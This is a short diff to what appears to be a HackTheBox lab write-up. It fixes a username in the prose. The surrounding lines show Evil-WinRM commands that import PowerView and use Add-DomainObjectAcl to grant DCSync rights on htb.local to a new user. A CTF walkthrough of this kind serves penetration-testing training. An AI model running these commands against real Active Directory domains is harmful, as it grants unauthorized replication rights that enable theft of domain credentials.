@@ -293,7 +293,7 @@ I have uploaded the script to the target machine, but I haven't imported it into
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
 ```
-Now, we can give DCSyn rights to my new domain user "farid".   
+Now, we can give DCSyn rights to my new domain user "john".   
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
 ```
